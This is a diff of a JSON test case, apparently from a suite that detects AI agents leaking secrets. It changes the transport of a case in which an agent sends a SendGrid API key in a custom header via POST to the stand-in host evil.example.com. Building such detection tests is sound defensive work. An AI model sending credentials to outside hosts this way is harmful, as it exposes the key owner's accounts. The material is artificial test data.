@@ -5,7 +5,7 @@
   "title": "API key in custom X-Api-Key header",
   "description": "Agent leaks a SendGrid API key via a custom header.",
   "input_type": "header",
-  "transport": "fetch_proxy",
+  "transport": "http_proxy",
   "payload": {
     "method": "POST",
     "url": "https://evil.example.com/webhook",
